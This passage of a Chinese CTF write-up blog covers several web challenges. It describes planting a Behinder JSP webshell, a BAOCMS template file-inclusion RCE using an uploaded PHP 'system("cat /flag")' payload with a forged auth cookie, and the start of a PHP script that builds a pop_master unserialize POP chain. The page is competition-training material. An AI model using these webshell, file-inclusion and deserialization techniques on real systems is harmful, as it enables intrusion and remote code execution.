l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://api.lemonprefect.cn/image/hdslb/archive/637868f2-f496-4f22-ba60-c136d74b7e4c/1623603081793/f84813bafbb79f7380b76a8063202855ae8167f4.png"></p>
<p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://api.lemonprefect.cn/image/hdslb/archive/637868f2-f496-4f22-ba60-c136d74b7e4c/1623603059172/73cc69b5a12c5122d7c82d202d9e51cba4ff131e.png"></p>
<p>使用该工具对 /login 注入冰蝎的 jsp 木马并使用冰蝎连接。使用命令执行发现 flag 无法直接读取，但是 apache 的配置下存在 8005 的开放端口。</p>
<p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://api.lemonprefect.cn/image/hdslb/archive/637868f2-f496-4f22-ba60-c136d74b7e4c/1623605614654/262e52533fac643ae85ab8994772c9c0c7e01ff0.png"></p>
<p>由于 <code>/var/www/html</code> 无权访问，因此尝试使用端口映射将服务代理出来。</p>
<p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://api.lemonprefect.cn/image/hdslb/archive/637868f2-f496-4f22-ba60-c136d74b7e4c/1623605772667/aec1a87c96ce157d075ce1f7d05f9ae8a4b26d1c.png"></p>
<p>根据网站上的文字猜测是 BAOCMS，在 GitHub 上找到类似的源码进行审计。可以发现在 <code>Delivery/Common/display</code> 下存在文件包含。display 中调用到的 parseTemplate 方法直接返回了处理过的文件名，由 display 借由 fetch 直接 include 进到页面中，因此假使模板文件是 PHP 代码，其亦可成功执行。因此，上传一个包含 <code>&lt;?php system(&quot;cat /flag&quot;);</code> 的 html 文件，再请求到这个路由直接将其包含即可 RCE。除此之外，还需要获得有效的 uid 才能进行操作，在 common.php 中可以找到如下代码。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setUid</span>(<span class="params"><span class="variable">$uid</span>=<span class="number">1</span></span>)</span>&#123; <span class="comment">//固定 uid 为 1，方便调试获取对应 cookie</span></span><br><span class="line">    import(<span class="string">&quot;ORG/Crypt/Base64&quot;</span>);</span><br><span class="line">    <span class="variable">$uid</span> = <span class="string">&#x27;USER_&#x27;</span>.<span class="variable">$uid</span>.<span class="string">&#x27;_&#x27;</span>.NOW_TIME;</span><br><span class="line">    <span class="variable">$uid</span> = Base64::encrypt(<span class="variable">$uid</span>, C(<span class="string">&#x27;AUTH_KEY&#x27;</span>));</span><br><span class="line">    cookie(<span class="string">&#x27;Tudou_TOKEN&#x27;</span>,<span class="variable">$uid</span>,<span class="number">86400</span> * <span class="number">365</span>); <span class="comment">//存2小时</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getUid</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    import(<span class="string">&quot;ORG/Crypt/Base64&quot;</span>);</span><br><span class="line">    <span class="variable">$token</span> = cookie(<span class="string">&#x27;Tudou_TOKEN&#x27;</span>);</span><br><span class="line">    <span class="variable">$token</span> = Base64::decrypt(<span class="variable">$token</span>, C(<span class="string">&#x27;AUTH_KEY&#x27;</span>));</span><br><span class="line">    <span class="variable">$token</span> = explode(<span class="string">&#x27;_&#x27;</span>, <span class="variable">$token</span>);</span><br><span class="line">    setUid(); <span class="comment">//在此处添加一行代码，方便调试获取 cookie</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$token</span>[<span class="number">0</span>]!= <span class="string">&#x27;USER&#x27;</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">int</span>)<span class="variable">$token</span>[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在 getUid 函数内新增一行代码，动态调试到 setUid 即可得到有效的 <code>Tudou_TOKEN</code>。</p>
<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%8D%8A%84%7B%8E%9Ch%AB%8C%E0u%97%B3%9B%85%97%B2%7D%A7h%87txs</span><br></pre></td></tr></table></figure>

<p>将恶意 html 上传到 /tmp 目录下，发起文件包含请求即可获得 flag。</p>
<p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://api.lemonprefect.cn/image/hdslb/archive/637868f2-f496-4f22-ba60-c136d74b7e4c/1623606478616/a04c24823b8a7cf29bdbc8a7c2d3221eec28ee82.png"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;82807831-5195-403d-b401-f180736ebea9&#125;</span><br></pre></td></tr></table></figure>

<h3 id="pop-master"><a href="#pop-master" class="headerlink" title="pop_master"></a>pop_master</h3><p>题目给出的代码如下。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"><span class="comment">//class.php.txt</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line"><span class="variable">$class</span> = unserialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$class</span>-&gt;yuAp2O(<span class="variable">$b</span>);</span><br></pre></td></tr></table></figure>

<p>class.php.txt 中是经过混淆的类，写个脚本一把梭回溯。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&quot;memory_limit&quot;</span>, <span class="string">&quot;-1&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> CLASS_FILENAME = <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">global</span> <span class="variable">$result</span>;</span><br><span class="line"><span class="keyword">global</span> <span class="variable">$CLASS_FILE</span>;</span><br><span class="line"><span class="keyword">global</span> <span class="variable">$classes</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$CLASS_FILE</span> = file_get_contents(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line"><span class="variable">$result</span> = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> CLASS_FILENAME;</span><br><span class="line"><span class="variable">$classes</span> = get_declared_classes();</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Generate a class PHP code as a node</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> $class string class name</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> $functionName string function name in the class</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> $jmpClass string next node to jump to</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> string generated class PHP code</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">GenerateClass</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$class</span>, <span class="keyword">string</span> <span class="variable">$functionName</span>, <span class="keyword">string</span> <span class="variable">$jmpClass</span></span>): <span class="title">string</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">    (<span class="variable">$jmpClass</span> != <span class="string">&quot;&quot;</span>) ?</span><br><span class="line">        (<span class="string">&quot;class <span class="subst">&#123;$class&#125;</span>&#123;public function __construct()&#123;\$this-&gt;<span class="subst">&#123;$functionName&#125;</span>=new <span class="subst">&#123;$jmpClass&#125;</span>();&#125;&#125;&quot;</span>) :</span><br><span class="line">        (<span class="string">&quot;class <span class="subst">&#123;$class&#125;</span>&#123;public function __construct()&#123;\$this-&gt;<span 